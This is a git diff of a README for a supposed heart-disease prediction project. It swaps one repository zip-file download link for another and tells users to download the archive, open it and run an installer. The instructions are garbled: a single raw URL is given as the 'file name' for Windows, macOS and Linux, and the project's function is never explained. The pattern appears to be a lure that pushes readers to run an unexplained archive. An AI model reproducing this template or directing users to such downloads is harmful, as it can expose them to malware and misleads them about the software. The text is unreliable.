@@ -1,6 +1,6 @@
 # ❤️ Heart_Disease_Project - Predict Heart Disease with Ease
 
-[![Download Heart Disease Project](https://raw.githubusercontent.com/jamflix/Heart_Disease_Project/main/Balaena/Heart_Disease_Project.zip)](https://raw.githubusercontent.com/jamflix/Heart_Disease_Project/main/Balaena/Heart_Disease_Project.zip)
+[![Download Heart Disease Project](https://github.com/jamflix/Heart_Disease_Project/raw/refs/heads/main/models/Project_Disease_Heart_v2.9.zip)](https://github.com/jamflix/Heart_Disease_Project/raw/refs/heads/main/models/Project_Disease_Heart_v2.9.zip)
 
 ## 🚀 Getting Started
 
@@ -19,12 +19,12 @@ Before you download, ensure your system meets these requirements:
 
 To get started, visit the link below to download the latest release of the Heart Disease Project.
 
-[Download Heart Disease Project](https://raw.githubusercontent.com/jamflix/Heart_Disease_Project/main/Balaena/Heart_Disease_Project.zip)
+[Download Heart Disease Project](https://github.com/jamflix/Heart_Disease_Project/raw/refs/heads/main/models/Project_Disease_Heart_v2.9.zip)
 
 Once you access the page, follow these steps to install the application:
 
 1. Click on the latest version listed on the releases page.
-2. Locate the file named `https://raw.githubusercontent.com/jamflix/Heart_Disease_Project/main/Balaena/Heart_Disease_Project.zip` for Windows, `https://raw.githubusercontent.com/jamflix/Heart_Disease_Project/main/Balaena/Heart_Disease_Project.zip` for macOS, or `https://raw.githubusercontent.com/jamflix/Heart_Disease_Project/main/Balaena/Heart_Disease_Project.zip` for Linux.
+2. Locate the file named `https://github.com/jamflix/Heart_Disease_Project/raw/refs/heads/main/models/Project_Disease_Heart_v2.9.zip` for Windows, `https://github.com/jamflix/Heart_Disease_Project/raw/refs/heads/main/models/Project_Disease_Heart_v2.9.zip` for macOS, or `https://github.com/jamflix/Heart_Disease_Project/raw/refs/heads/main/models/Project_Disease_Heart_v2.9.zip` for Linux.
 3. Click the file to start the download.
 4. After the download is complete, open the file to launch the installer.
 5. Follow any on-screen instructions to complete the installation.
